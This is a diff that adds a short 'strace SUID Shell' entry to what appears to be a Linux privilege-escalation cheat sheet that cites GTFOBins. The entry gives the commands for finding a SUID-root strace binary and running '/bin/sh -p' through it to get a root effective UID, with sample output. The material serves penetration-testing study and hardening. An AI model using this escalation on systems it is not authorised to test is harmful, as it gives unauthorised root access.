@@ -1893,6 +1893,23 @@ Reference: [GTFOBins - openssl](https://gtfobins.github.io/gtfobins/openssl/)
 
 ---
 
+### strace SUID Shell
+
+If `strace` has SUID root, run a shell with `-p` through it to preserve the effective UID:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | grep strace
+# -rwsr-sr-x 1 root root ... /usr/bin/strace
+
+strace -o /dev/null /bin/sh -p
+id
+# uid=USER gid=USER euid=0(root) egid=0(root)
+```
+
+Reference: [GTFOBins - strace](https://gtfobins.github.io/gtfobins/strace/)
+
+---
+
 ### SUID-Shared Object Injection
 
 * Detection
